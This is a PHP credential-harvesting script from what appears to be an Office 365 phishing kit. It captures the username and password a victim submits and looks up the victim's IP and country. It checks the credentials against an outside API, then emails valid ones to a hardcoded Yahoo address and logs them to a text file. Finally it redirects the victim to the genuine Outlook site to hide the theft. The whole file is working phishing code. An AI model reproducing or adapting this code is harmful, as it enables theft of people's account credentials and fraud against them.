<?php
// Genral 365 Version 0.1
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$recipient = 'workbox1600@yahoo.com'; // Put your email address here

if(isset($_POST['user']) && isset($_POST['pass'])){


function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_POST['user'];
$pass = $_POST['pass'];
$api = 'http://my-ips.org/ip/index.php'; //put api url
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$over = 'https://outlook.office.com';
		$message = "-----------------+ OFFICE365 VERIFIED +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "-----------------+ Created By 3D4 H4CK3R+------------------\n";
		$subject = "OFFICE 365 | True Login: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";

		mail($recipient, $subject, $message, $headers);
		@fclose(@fwrite(@fopen("Office-login.txt", "a"),$message));

		header("Location: $over");
		}
	  else
		{
		header("Location: index.php?error&id=$user&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		}
	}

?>
